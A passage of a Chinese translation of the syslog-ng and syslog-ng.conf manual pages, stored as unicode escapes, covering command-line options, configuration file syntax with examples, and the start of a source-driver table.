\u5c06\u6839\u76ee\u5f55\u66f4\u6539\u4e3a\u6307\u5b9a\u7684\u76ee\u5f55\u3002\u914d\u7f6e\u6587\u4ef6\u662f\u5728chroot\u4e4b\u540e\u8bfb\u53d6\u7684\uff0c\u56e0\u6b64\u914d\u7f6e\u6587\u4ef6\u5fc5\u987b\u5728chroot\u4e2d\u53ef\u7528\u3002\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\uff0c\u8fd8\u53ef\u4ee5\u5728\u8bb0\u5f55\u4e4b\u540e\u91cd\u65b0\u52a0\u8f7dsyslog-ng\u914d\u7f6e\u3002\u4f46\u662f\uff0c\u8bf7\u6ce8\u610f\uff0c--user\u548c--group\u9009\u9879\u662f\u5728\u8bb0\u5f55\u4e4b\u524d\u89e3\u6790\u7684\u3002 --debug or -d \u5728\u8c03\u8bd5\u6a21\u5f0f\u4e0b\u542f\u52a8syslog ng\u3002 --default-modules \u81ea\u52a8\u52a0\u8f7d\u7684\u6a21\u5757\u7684\u9017\u53f7\u5206\u9694\u5217\u8868\u3002\u672a\u81ea\u52a8\u52a0\u8f7d\u7684\u6a21\u5757\u53ef\u4ee5\u901a\u8fc7\u5728syslog ng OSE\u914d\u7f6e\u6587\u4ef6\u4e2d\u5305\u542b@module\uff1cmodulename\uff1e\u8bed\u53e5\u6765\u52a0\u8f7d\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u52a0\u8f7d\u4ee5\u4e0b\u6a21\u5757\uff1aaffile\u3001afprog\u3001afsocket\u3001afuser\u3001basicfuncs\u3001csvparser\u3001dbparser\u3001syslogformat\u3001afsql\u3002\u4ec5\u5728syslog ng Open Source Edition 3.3\u53ca\u66f4\u9ad8\u7248\u672c\u4e2d\u63d0\u4f9b\u3002 --enable-core \u542f\u7528syslog ng\u5728\u5d29\u6e83\u65f6\u5199\u5165\u6838\u5fc3\u6587\u4ef6\uff0c\u4ee5\u5e2e\u52a9\u652f\u6301\u548c\u8c03\u8bd5\u3002 --fd-limit <number> \u8bbe\u7f6e\u6240\u9700\u6587\u4ef6\u63cf\u8ff0\u7b26\uff08fd-s\uff09\u7684\u6700\u5c0f\u6570\u91cf\uff1b\u8fd9\u8bbe\u7f6e\u4e86syslog ng\u53ef\u4ee5\u540c\u65f6\u6253\u5f00\u7684\u6587\u4ef6\u6570\u3002\u9ed8\u8ba4\u503c\uff1a4096\u3002\u8bf7\u6ce8\u610f\uff0c\u8fd9\u4e0d\u4f1a\u8986\u76d6\u4e3b\u673a\u7684\u5168\u5c40ulimit\u8bbe\u7f6e\u3002 --foreground or -F \u4e0d\u8981\u8fdb\u884c\u540e\u53f0\u5904\u7406\uff0c\u5728\u524d\u53f0\u8fd0\u884c\u3002 --group <group> or -g <group> \u521d\u59cb\u5316\u914d\u7f6e\u6587\u4ef6\u540e\u5207\u6362\u5230\u6307\u5b9a\u7684\u7ec4\u3002 --help or -h \u6253\u5370\u5e2e\u52a9\u4fe1\u606f --module-registry \u663e\u793a\u53ef\u7528\u6a21\u5757\u7684\u5217\u8868\u548c\u8bf4\u660e\u3002\u8bf7\u6ce8\u610f\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u8fd9\u4e9b\u6a21\u5757\u90fd\u662f\u81ea\u52a8\u52a0\u8f7d\u7684\uff0c\u53ea\u6709\u5728--default modules\u9009\u9879\u4e2d\u6307\u5b9a\u7684\u6a21\u5757\u3002\u4ec5\u5728syslog ng Open Source Edition 3.3\u53ca\u66f4\u9ad8\u7248\u672c\u4e2d\u63d0\u4f9b\u3002 --no-caps \u5728\u6ca1\u6709\u529f\u80fd\u652f\u6301\u7684\u60c5\u51b5\u4e0b\uff0c\u4ee5root\u8eab\u4efd\u8fd0\u884csyslog ng\u3002\u8fd9\u662f\u9ed8\u8ba4\u884c\u4e3a\u3002\u5728Linux\u4e0a\uff0c\u5982\u679csyslog ng\u662f\u5728\u542f\u7528--enable-Linux-caps\u9009\u9879\u7684\u60c5\u51b5\u4e0b\u7f16\u8bd1\u7684\uff0c\u5219\u53ef\u4ee5\u4ee5\u975eroot\u8eab\u4efd\u8fd0\u884csyslog ng\u5e76\u63d0\u4f9b\u529f\u80fd\u652f\u6301\u3002\uff08\u6267\u884csyslog ng--version\u4ee5\u663e\u793a\u5df2\u542f\u7528\u7684\u751f\u6210\u53c2\u6570\u5217\u8868\u3002\uff09 --persist-file <persist-file> or -R <persist-file> \u8bbe\u7f6e\u5b58\u50a8\u6301\u4e45\u9009\u9879\u548c\u6570\u636e\u7684syslog-ng.persistent\u6587\u4ef6\u7684\u8def\u5f84\u548c\u540d\u79f0\u3002 --pidfile <pidfile> or -p <pidfile> \u8bbe\u7f6e\u5b58\u50a8\u4e3b\u8fdb\u7a0bPID\u7684PID\u6587\u4ef6\u7684\u8def\u5f84\u3002 --preprocess-into <output-file> \u5904\u7406\u5b8c\u914d\u7f6e\u6587\u4ef6\u5e76\u89e3\u6790\u4e86\u5305\u542b\u7684\u6587\u4ef6\u548c\u53d8\u91cf\u540e\uff0c\u5c06\u751f\u6210\u7684\u914d\u7f6e\u5199\u5165\u6307\u5b9a\u7684\u8f93\u51fa\u6587\u4ef6\u3002\u4ec5\u5728syslog ng Open Source Edition 3.3\u53ca\u66f4\u9ad8\u7248\u672c\u4e2d\u63d0\u4f9b\u3002 --process-mode <mode> \u8bbe\u7f6e\u5982\u4f55\u5728\u524d\u53f0\uff08\u4e3b\u8981\u7528\u4e8e\u8c03\u8bd5\uff09\u3001\u540e\u53f0\u4f5c\u4e3a\u540e\u53f0\u8fdb\u7a0b\u6216\u5b89\u5168\u540e\u53f0\u6a21\u5f0f\u4e0b\u8fd0\u884csyslog ng\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0csyslog ng\u5728\u5b89\u5168\u540e\u53f0\u6a21\u5f0f\u4e0b\u8fd0\u884c\u3002\u6b64\u6a21\u5f0f\u521b\u5efa\u4e00\u4e2a\u540d\u4e3asupervisoring syslog ng\u7684\u4e3b\u7ba1\u8fdb\u7a0b\uff0c\u5982\u679c\u7cfb\u7edf\u65e5\u5fd7ng\u5d29\u6e83\uff0c\u8be5\u8fdb\u7a0b\u5c06\u91cd\u65b0\u542f\u52a8\u3002 --stderr or -e \u5c06syslog ng\u7684\u5185\u90e8\u6d88\u606f\u8bb0\u5f55\u5230stderr\u3002\u4e3b\u8981\u4e0e--foreground\u9009\u9879\u4e00\u8d77\u7528\u4e8e\u8c03\u8bd5\u76ee\u7684\u3002\u5982\u679c\u672a\u6307\u5b9a\uff0csyslog ng\u5c06\u628a\u6b64\u7c7b\u6d88\u606f\u8bb0\u5f55\u5230\u5176\u5185\u90e8\u6e90\u3002 --syntax-only or -s \u9a8c\u8bc1\u914d\u7f6e\u6587\u4ef6\u7684\u8bed\u6cd5\u662f\u5426\u6b63\u786e\uff0c\u7136\u540e\u9000\u51fa\u3002 --user <user> or -u <user> \u5728\u521d\u59cb\u5316\u914d\u7f6e\u6587\u4ef6\uff08\u4ee5\u53ca\u53ef\u9009\u7684chrooting\uff09\u540e\u5207\u6362\u5230\u6307\u5b9a\u7684\u7528\u6237\u3002\u8bf7\u6ce8\u610f\uff0c\u5982\u679c\u6307\u5b9a\u7684\u7528\u6237\u6ca1\u6709\u521b\u5efa/dev/log\u6587\u4ef6\u7684\u6743\u9650\uff0c\u5219\u4e0d\u53ef\u80fd\u91cd\u65b0\u52a0\u8f7dsyslog ng\u914d\u7f6e\u3002 --verbose or -v \u542f\u7528\u7528\u4e8e\u6392\u9664syslog ng\u6545\u969c\u7684\u8be6\u7ec6\u65e5\u5fd7\u8bb0\u5f55\u3002 --version or -V \u663e\u793a\u7248\u672c\u53f7\u548c\u7f16\u8bd1\u4fe1\u606f\uff0c\u4ee5\u53ca\u53ef\u7528\u6a21\u5757\u7684\u5217\u8868\u548c\u7b80\u77ed\u63cf\u8ff0\u3002\u6709\u5173\u53ef\u7528\u6a21\u5757\u7684\u8be6\u7ec6\u63cf\u8ff0\uff0c\u8bf7\u53c2\u9605--module\u6ce8\u518c\u8868\u9009\u9879\u3002\u8bf7\u6ce8\u610f\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u8fd9\u4e9b\u6a21\u5757\u90fd\u662f\u81ea\u52a8\u52a0\u8f7d\u7684\uff0c\u53ea\u6709\u5728--default modules\u9009\u9879\u4e2d\u6307\u5b9a\u7684\u6a21\u5757\u3002 --worker-threads \u8bbe\u7f6esyslog ng OSE\u53ef\u4ee5\u4f7f\u7528\u7684\u8f85\u52a9\u7ebf\u7a0b\u6570\uff0c\u5305\u62ec\u4e3bsyslog ng OS E\u7ebf\u7a0b\u3002\u8bf7\u6ce8\u610f\uff0csyslog ng OSE\u4e2d\u7684\u67d0\u4e9b\u64cd\u4f5c\u53ef\u4ee5\u4f7f\u7528\u4e0d\u53d7\u6b64\u9009\u9879\u9650\u5236\u7684\u7ebf\u7a0b\u3002\u53ea\u6709\u5f53syslog ng OSE\u5728\u591a\u7ebf\u7a0b\u6a21\u5f0f\u4e0b\u8fd0\u884c\u65f6\uff0c\u6b64\u8bbe\u7f6e\u624d\u6709\u6548\u3002\u4ec5\u5728syslog ng Open Source Edition 3.3\u53ca\u66f4\u9ad8\u7248\u672c\u4e2d\u63d0\u4f9b\u3002\u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605syslog ng Open Source Edition 3.3\u7ba1\u7406\u5458\u6307\u5357\u3002 \u5176\u4ed6 syslog-ng.conf(5) syslog ng OSE 3.3\u7ba1\u7406\u5458\u6307\u5357[1] \u5982\u679c\u60a8\u5728\u4f7f\u7528syslog ng\u65f6\u9047\u5230\u4efb\u4f55\u95ee\u9898\u6216\u9700\u8981\u5e2e\u52a9\uff0c\u8bf7\u8bbf\u95eesyslog ng wiki[3]\u6216syslog ng\u90ae\u4ef6\u5217\u8868[4]\u3002 \u6709\u5173syslog ng\u7684\u65b0\u95fb\u548c\u901a\u77e5\uff0c\u8bf7\u8bbf\u95eesyslog ng Insider\u535a\u5ba2[5]\u3002 \u4f5c\u8005 \u672c\u624b\u518c\u9875\u7531BalaBit\u6587\u6863\u56e2\u961f\u7f16\u5199<documentation@balabit.com>\u3002 \u7248\u6743 \u4f5c\u8005\u6839\u636eGNU\u901a\u7528\u516c\u5171\u8bb8\u53ef\u8bc1\u7b2c2\u7248\u6216\u66f4\u65b0\u7248\u672c\uff08GPL v2+\uff09\u7684\u6761\u6b3e\uff0c\u6388\u4e88\u590d\u5236\u3001\u5206\u53d1\u548c/\u6216\u4fee\u6539\u672c\u624b\u518c\u9875\u9762\u7684\u6743\u9650\u3002 \u540e\u8bb0 1. \u300asyslog ng\u5f00\u653e\u6e90\u4ee3\u7801\u7248\u7ba1\u7406\u5458\u6307\u5357\u300b http://www.balabit.com/support/documentation/ 2. syslog ng\u5b98\u65b9\u7f51\u7ad9 http://www.balabit.com/network-security/syslog-ng/ 3. \u8bbf\u95ee syslog-ng wiki http://www.balabit.com/wiki/syslog-ng-faq 4. syslog-ng \u90ae\u4ef6\u5217\u8868 https://lists.balabit.hu/mailman/listinfo/syslog-ng 5. syslog-ng \u5185\u90e8\u535a\u5ba2 http://insider.blogs.balabit.com \u914d\u7f6e\u6587\u4ef6 syslog-ng.conf SYSLOG-NG.CONF(5) The syslog-ng.conf \u624b\u518c\u9875 SYSLOG-NG.CONF(5) \u540d\u5b57 syslog-ng.conf - syslog-ng\u5e94\u7528\u7a0b\u5e8f \u914d\u7f6e\u6587\u4ef6 \u7b80\u4ecb syslog-ng.conf DESCRIPTION \u672c\u624b\u518c\u9875\u4ec5\u4e3a\u6458\u8981\uff1b\u6709\u5173syslog ng\u7684\u5b8c\u6574\u6587\u6863\uff0c\u8bf7\u53c2\u9605\u300asyslog ng\u5f00\u653e\u6e90\u4ee3\u7801\u7248\u7ba1\u7406\u5458\u6307\u5357\u300b[1]\u6216syslog ng\u5b98\u65b9\u7f51\u7ad9[2]\u3002syslog ng OSE\u5e94\u7528\u7a0b\u5e8f\u662f\u4e00\u4e2a\u7075\u6d3b\u4e14\u9ad8\u5ea6\u53ef\u6269\u5c55\u7684\u7cfb\u7edf\u65e5\u5fd7\u5e94\u7528\u7a0b\u5e8f\u3002\u901a\u5e38\uff0csyslog ng\u7528\u4e8e\u7ba1\u7406\u65e5\u5fd7\u6d88\u606f\u5e76\u5b9e\u73b0\u96c6\u4e2d\u5f0f\u65e5\u5fd7\u8bb0\u5f55\uff0c\u5176\u76ee\u7684\u662f\u5728\u5355\u4e2a\u4e2d\u592e\u65e5\u5fd7\u670d\u52a1\u5668\u4e0a\u6536\u96c6\u591a\u4e2a\u8bbe\u5907\u7684\u65e5\u5fd7\u6d88\u606f\u3002\u4e0d\u540c\u7684\u8bbe\u5907\uff08\u79f0\u4e3asyslog ng\u5ba2\u6237\u7aef\uff09\u90fd\u8fd0\u884csyslog ng\uff0c\u5e76\u4ece\u5404\u79cd\u5e94\u7528\u7a0b\u5e8f\u3001\u6587\u4ef6\u548c\u5176\u4ed6\u6765\u6e90\u6536\u96c6\u65e5\u5fd7\u6d88\u606f\u3002\u5ba2\u6237\u7aef\u5c06\u6240\u6709\u91cd\u8981\u7684\u65e5\u5fd7\u6d88\u606f\u53d1\u9001\u5230\u8fdc\u7a0bsyslog ng\u670d\u52a1\u5668\uff0c\u670d\u52a1\u5668\u5728\u90a3\u91cc\u5bf9\u5b83\u4eec\u8fdb\u884c\u6392\u5e8f\u548c\u5b58\u50a8\u3002syslog ng\u5e94\u7528\u7a0b\u5e8f\u8bfb\u53d6\u4f20\u5165\u6d88\u606f\u5e76\u5c06\u5176\u8f6c\u53d1\u5230\u9009\u5b9a\u7684\u76ee\u7684\u5730\u3002syslog ng\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u63a5\u6536\u6765\u81ea\u6587\u4ef6\u3001\u8fdc\u7a0b\u4e3b\u673a\u548c\u5176\u4ed6\u6765\u6e90\u7684\u6d88\u606f\u3002\u65e5\u5fd7\u6d88\u606f\u5728\u4e00\u4e2a\u5b9a\u4e49\u7684\u6e90\u4e2d\u8f93\u5165syslog ng\uff0c\u5e76\u53d1\u9001\u5230\u4e00\u4e2a\u6216\u591a\u4e2a\u76ee\u7684\u5730\u3002\u6765\u6e90\u548c\u76ee\u7684\u5730\u662f\u72ec\u7acb\u7684\u5bf9\u8c61\uff1b\u65e5\u5fd7\u8def\u5f84\u5b9a\u4e49syslogng\u5bf9\u6d88\u606f\u7684\u5904\u7406\u65b9\u5f0f\uff0c\u5c06\u6e90\u8fde\u63a5\u5230\u76ee\u6807\u3002\u65e5\u5fd7\u8def\u5f84\u7531\u4e00\u4e2a\u6216\u591a\u4e2a\u6e90\u548c\u4e00\u4e2a\u6216\u66f4\u591a\u4e2a\u76ee\u7684\u5730\u7ec4\u6210\uff1b\u4ece\u6e90\u5230\u8fbe\u7684\u6d88\u606f\u88ab\u53d1\u9001\u5230\u65e5\u5fd7\u8def\u5f84\u4e2d\u5217\u51fa\u7684\u6bcf\u4e2a\u76ee\u7684\u5730\u3002\u5728syslog ng\u4e2d\u5b9a\u4e49\u7684\u65e5\u5fd7\u8def\u5f84\u79f0\u4e3a\u65e5\u5fd7\u8bed\u53e5\u3002\u53ef\u9009\u5730\uff0c\u65e5\u5fd7\u8def\u5f84\u53ef\u4ee5\u5305\u62ec\u7b5b\u9009\u5668\u3002\u8fc7\u6ee4\u5668\u662f\u53ea\u9009\u62e9\u67d0\u4e9b\u6d88\u606f\u7684\u89c4\u5219\uff0c\u4f8b\u5982\uff0c\u53ea\u9009\u62e9\u7279\u5b9a\u5e94\u7528\u7a0b\u5e8f\u53d1\u9001\u7684\u6d88\u606f\u3002\u5982\u679c\u65e5\u5fd7\u8def\u5f84\u5305\u542b\u7b5b\u9009\u5668\uff0c\u5219syslog ng\u53ea\u5c06\u6ee1\u8db3\u7b5b\u9009\u5668\u89c4\u5219\u7684\u6d88\u606f\u53d1\u9001\u5230\u65e5\u5fd7\u8def\u5f84\u4e2d\u8bbe\u7f6e\u7684\u76ee\u7684\u5730\u3002 \u914d\u7f6e SYSLOG-NG \u914d\u7f6e\u6587\u4ef6\u7684\u4e3b\u4f53\u7531\u5bf9\u8c61\u5b9a\u4e49\u7ec4\u6210\uff1a\u6e90\u3001\u76ee\u7684\u5730\u3001\u65e5\u5fd7\u8def\u5f84\u5b9a\u4e49\u63a5\u6536\u7684\u65e5\u5fd7\u6d88\u606f\u4ee5\u53ca\u53d1\u9001\u7684\u4f4d\u7f6e\u3002syslog ng\u914d\u7f6e\u6587\u4ef6\u4e2d\u4f7f\u7528\u7684\u6240\u6709\u6807\u8bc6\u7b26\u3001\u9009\u9879\u540d\u79f0\u548c\u5c5e\u6027\u4ee5\u53ca\u4efb\u4f55\u5176\u4ed6\u5b57\u7b26\u4e32\u90fd\u533a\u5206\u5927\u5c0f\u5199\u3002\u5728\u53e6\u4e00\u4e2a\u8bed\u53e5\u4e2d\u5f15\u7528\u5bf9\u8c61\u4e4b\u524d\uff0c\u5fc5\u987b\u5148\u5b9a\u4e49\u5bf9\u8c61\u3002\u5bf9\u8c61\u5b9a\u4e49\uff08\u4e5f\u79f0\u4e3a\u8bed\u53e5\uff09\u5177\u6709\u4ee5\u4e0b\u8bed\u6cd5\uff1a object_type object_id {<options>}; \u00b7\u5bf9\u8c61\u7684\u7c7b\u578b: \u6e90, \u76ee\u7684\u5730, \u65e5\u5fd7, \u6ee4\u6ce2\u5668, \u89e3\u6790\u5668, \u91cd\u5199\u89c4\u5219, \u6216\u8005 \u6a21\u677f. \u00b7object_id: \u6807\u8bc6\u5bf9\u8c61\u7684\u552f\u4e00\u540d\u79f0\u3002\u4f7f\u7528\u4fdd\u7559\u5b57\u4f5c\u4e3a\u6807\u8bc6\u7b26\u65f6\uff0c\u8bf7\u5c06\u6807\u8bc6\u7b26\u7528\u5f15\u53f7\u62ec\u8d77\u6765\u3002 \u63d0\u793a\uff1a\u4f7f\u7528\u4e0e\u4ed6\u4eec\u8bc6\u522b\u7684\u5bf9\u8c61\u7c7b\u578b\u76f8\u5173\u7684\u6807\u8bc6\u7b26\u3002\u4f8b\u5982\uff0c\u7528s_\u4f5c\u4e3a\u6e90\u5bf9\u8c61\u7684\u524d\u7f00\uff0c\u7528d_\u4f5c\u4e3a\u76ee\u7684\u5730\u7684\u524d\u7f00\uff0c\u4f9d\u6b64\u7c7b\u63a8\u3002 \u00b7Parameters: \u5bf9\u8c61\u7684\u53c2\u6570\uff0c\u7528\u5927\u62ec\u53f7\uff5bparameters\uff5d\u62ec\u8d77\u6765\u3002 \u00b7Semicolon: \u5bf9\u8c61\u5b9a\u4e49\u4ee5\u5206\u53f7\uff08\uff1b\uff09\u7ed3\u5c3e\u3002 \u4f8b\u5982\uff0c\u4e0b\u9762\u7684\u884c\u5b9a\u4e49\u4e86\u4e00\u4e2a\u6e90\uff0c\u5e76\u5c06\u5176\u79f0\u4e3as_internal\u3002 source s_internal { internal(); }; \u7a0d\u540e\u53ef\u4ee5\u4f7f\u7528\u5bf9\u8c61\u7684ID\u5728\u5176\u4ed6\u8bed\u53e5\u4e2d\u5f15\u7528\u8be5\u5bf9\u8c61\uff0c\u4f8b\u5982\uff0c\u4ee5\u524d\u7684\u6e90\u7528\u4f5c\u4ee5\u4e0b\u65e5\u5fd7\u8bed\u53e5\u7684\u53c2\u6570\uff1a log { source(s_internal); destination(d_file); }; \u00b7\u8bed\u53e5\u4e2d\u7684\u53c2\u6570\u548c\u9009\u9879\u7c7b\u4f3c\u4e8eC\u7f16\u7a0b\u8bed\u8a00\u7684\u51fd\u6570\u8c03\u7528\uff1a\u9009\u9879\u7684\u540d\u79f0\u540e\u9762\u8ddf\u7740\u4e00\u4e2a\u53c2\u6570\u5217\u8868\uff0c\u53c2\u6570\u5217\u8868\u62ec\u5728\u62ec\u53f7\u5185\uff0c\u5e76\u4ee5\u5206\u53f7\u7ed3\u675f\u3002 option(parameter1, parameter2); option2(parameter1, parameter2); \u4f8b\u5982\uff0c\u4ee5\u4e0b\u6e90\u8bed\u53e5\u6709\u4e09\u4e2a\u9009\u9879\uff1b\u524d\u4e24\u4e2a\u9009\u9879\uff08file\uff08\uff09\u548cfollow_freq\uff08\uff09\uff09\u53ea\u6709\u4e00\u4e2a\u53c2\u6570\uff0c\u800c\u7b2c\u4e09\u4e2a\u9009\u9879\uff08flags\uff08\uff09\uff09\u6709\u4e24\u4e2a\u53c2\u6570\uff1a source s_tail { file(\"/var/log/apache/access.log\" follow_freq(1) flags(no-parse, validate-utf8)); }; \u5bf9\u8c61\u53ef\u80fd\u5177\u6709\u5fc5\u9700\u53c2\u6570\u548c\u53ef\u9009\u53c2\u6570\u3002\u5fc5\u9700\u7684\u53c2\u6570\u662f\u4f4d\u7f6e\u53c2\u6570\uff0c\u8fd9\u610f\u5473\u7740\u5fc5\u987b\u6309\u7167\u5b9a\u4e49\u7684\u987a\u5e8f\u6307\u5b9a\u8fd9\u4e9b\u53c2\u6570\u3002\u53ef\u4ee5\u4f7f\u7528\u9009\u9879\uff08\u503c\uff09\u683c\u5f0f\u4ee5\u4efb\u4f55\u987a\u5e8f\u6307\u5b9a\u53ef\u9009\u53c2\u6570\u3002\u5982\u679c\u672a\u6307\u5b9a\u53c2\u6570\uff08\u53ef\u9009\u6216\u5fc5\u9700\uff09\uff0c\u5219\u4f7f\u7528\u5176\u9ed8\u8ba4\u503c\u3002\u53c2\u6570\u53ca\u5176\u9ed8\u8ba4\u503c\u5217\u5728\u7279\u5b9a\u5bf9\u8c61\u7684\u53c2\u7167\u90e8\u5206\u4e2d\u3002 \u793a\u4f8b1\u3002\u4f7f\u7528\u5fc5\u9700\u548c\u53ef\u9009\u53c2\u6570unix-stream\uff08\uff09\u6e90\u9a71\u52a8\u7a0b\u5e8f\u6709\u4e00\u4e2a\u5fc5\u9700\u7684\u53c2\u6570\uff1a\u8981\u4fa6\u542c\u7684\u5957\u63a5\u5b57\u7684\u540d\u79f0\u3002\u53ef\u9009\u53c2\u6570\u4ee5\u4efb\u4f55\u987a\u5e8f\u8ddf\u968f\u5957\u63a5\u5b57\u540d\u79f0\uff0c\u56e0\u6b64\u4ee5\u4e0b\u6e90\u5b9a\u4e49\u5177\u6709\u76f8\u540c\u7684\u6548\u679c\uff1a source s_demo_stream1 {unix-stream(\"/dev/log\" max-connections(10) group(log)); }; source s_demo_stream2 {unix-stream(\"/dev/log\" group(log) max-connections(10)); }; \u00b7\u6709\u4e9b\u9009\u9879\u662f\u5168\u5c40\u9009\u9879\uff0c\u6216\u8005\u53ef\u4ee5\u5168\u5c40\u8bbe\u7f6e\uff0c\u4f8b\u5982\uff0csyslog ng OSE\u662f\u5426\u5e94\u8be5\u4f7f\u7528DNS\u89e3\u6790\u6765\u89e3\u6790IP\u5730\u5740\u3002\u5168\u5c40\u9009\u9879\u8be6\u89c1\uff1f\uff1f\uff1f\u3002 options { use_dns(no); }; \u00b7syslog ng\u914d\u7f6e\u6587\u4ef6\u4e2d\u4f7f\u7528\u7684\u6240\u6709\u6807\u8bc6\u7b26\u3001\u5c5e\u6027\u548c\u4efb\u4f55\u5176\u4ed6\u5b57\u7b26\u4e32\u90fd\u533a\u5206\u5927\u5c0f\u5199\u3002 \u00b7\u5bf9\u8c61\u53ef\u4ee5\u5728\u5b9a\u4e49\u4e4b\u524d\u4f7f\u7528\u3002 \u00b7\u8981\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u6dfb\u52a0\u6ce8\u91ca\uff0c\u8bf7\u4ee5#\u5f00\u5934\u4e00\u884c\uff0c\u7136\u540e\u5199\u4e0b\u60a8\u7684\u6ce8\u91ca\u3002syslog ng\u5c06\u5ffd\u7565\u8fd9\u4e9b\u884c\u3002 # \u6ce8\u91ca: \u8fd9\u662f\u4e00\u4e2a\u6d41\u6e90 source s_demo_stream {unix-stream(\"/dev/log\" max-connections(10) group(log)); }; \u65e5\u5fd7\u8bed\u53e5\u7684\u8bed\u6cd5\u5982\u4e0b\uff1a log { source(s1); source(s2); ... optional_element(filter1|parser1|rewrite1); optional_element(filter2|parser2|rewrite2);... destination(d1); destination(d2); ... flags(flag1[, flag2...]); }; \u4e0b\u9762\u7684log\u8bed\u53e5\u5c06\u6240\u6709\u5230\u8fbe\u672c\u5730\u4e3b\u673a\u7684\u6d88\u606f\u53d1\u9001\u5230\u8fdc\u7a0b\u670d\u52a1\u5668\u3002 source s_localhost { tcp(ip(127.0.0.1) port(1999) ); }; destination d_tcp { tcp(\"10.1.2.3\" port(1999); localport(999)); }; log { source(s_localhost); destination(d_tcp); }; syslog-ng\u5e94\u7528\u7a0b\u5e8f\u6709\u8bb8\u591a\u5168\u5c40\u9009\u9879\u6765\u7ba1\u7406DNS\u4f7f\u7528\u3001\u4f7f\u7528\u7684\u65f6\u95f4\u6233\u683c\u5f0f\u4ee5\u53ca\u5176\u4ed6\u5e38\u89c4\u70b9\u3002\u6bcf\u4e2a\u9009\u9879\u53ef\u80fd\u90fd\u6709\u53c2\u6570\uff0c\u7c7b\u4f3c\u4e8e\u9a71\u52a8\u7a0b\u5e8f\u89c4\u8303\u3002\u8981\u8bbe\u7f6e\u5168\u5c40\u9009\u9879\uff0c\u8bf7\u4f7f\u7528\u4ee5\u4e0b\u8bed\u6cd5\u5c06\u9009\u9879\u8bed\u53e5\u6dfb\u52a0\u5230syslog ng\u914d\u7f6e\u6587\u4ef6\u4e2d\uff1a options { option1(params); option2(params); ... }; \u4e0b\u9762\u5217\u51fa\u4e86syslog ng\u4e2d\u53ef\u7528\u7684\u6e90\u3001\u76ee\u6807\u548c\u7b5b\u9009\u5668\u3002\u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605\u300asyslog ng\u7ba1\u7406\u5458\u6307\u5357\u300b[1]\u3002 - .sp \u88681\u3002syslog ng\u4e2d\u53ef\u7528\u7684\u6e90\u9a71\u52a8\u7a0b\u5e8f \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502\u540d\u5b57 \u2502 \u63cf\u8ff0 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502internal() \u2502 \u5728syslog ng\u4e2d\u5185\u90e8\u751f\u6210\u7684\u6d88\u606f\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502file() \u2502 \u6253\u5f00\u6307\u5b9a\u7684\u6587\u4ef6\u5e76\u8bfb\u53d6\u6d88\u606f\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502pipe(), fifo \u2502 \u6253\u5f00\u6307\u5b9a\u7684\u547d\u540d\u7ba1\u9053\u5e76\u8bfb\u53d6\u6d88\u606f\u3002 \u2502 